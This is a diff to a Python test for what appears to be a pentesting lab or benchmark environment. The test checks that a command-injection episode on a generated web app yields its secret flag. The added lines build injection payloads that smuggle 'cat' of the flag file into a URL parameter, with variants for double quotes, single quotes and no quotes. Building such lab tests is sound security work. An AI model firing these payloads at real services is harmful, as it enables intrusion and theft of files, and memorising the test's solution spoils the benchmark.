@@ -184,11 +184,19 @@ def test_command_injection_episode_recovers_flag(tmp_path: Path) -> None:
     expected = str(snap.graph.nodes["secret_flag"].attrs["value_ref"])
     pentest = next(t for t in snap.tasks if t.meta.get("family") == "webapp.pentest")
 
+    quote = params.get("quote", "")
+    if quote == '"':
+        payload = f"$(cat {flag_path})"  # substitution works inside double quotes
+    elif quote == "'":
+        payload = f"x'; cat {flag_path}; echo '"  # break out of single quotes
+    else:
+        payload = f"127.0.0.1; cat {flag_path}"
+
     svc = EpisodeService(WebappPack(), tmp_path)
     try:
         handle = svc.start_episode(snap, pentest.id)
         base = svc.surface(handle)["base_url"]
-        injection = urllib.parse.quote(f"127.0.0.1; cat {flag_path}")
+        injection = urllib.parse.quote(payload)
         exploit = f"{base}{url_path}?{params['target_param']}={injection}"
         recovered = urllib.request.urlopen(exploit, timeout=10).read().decode().strip()
         assert recovered == expected, recovered
